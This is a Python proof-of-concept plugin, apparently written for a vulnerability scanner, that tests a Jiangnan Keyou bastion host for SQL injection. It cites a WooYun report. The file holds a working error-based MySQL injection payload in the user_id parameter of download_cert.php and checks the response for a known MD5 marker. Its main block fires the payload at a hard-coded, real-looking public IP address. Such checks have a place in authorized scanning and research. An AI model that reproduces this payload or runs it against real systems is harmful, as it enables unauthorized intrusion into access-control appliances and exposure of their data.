#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友堡垒机注入
Author    :  a
mail      :  a@lcx.cc
refer     :   wooyun-2014-077033
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload='system/download_cert.php?manager=1&user_id=2%20and%20(select%202222%20from(select%20count(*),concat(md5(123),(select%20(case%20when%20(2222=2222)%20then%201%20else%200%20end)),0x7e7e7e,floor(Rand(0)*2))x%20from%20information_schema.character_sets%20group%20by%20x)a)&cert_psw=11'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code==200 and '202cb962ac59075b964b07152d234b701' in res:
        security_hole(target)
    
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])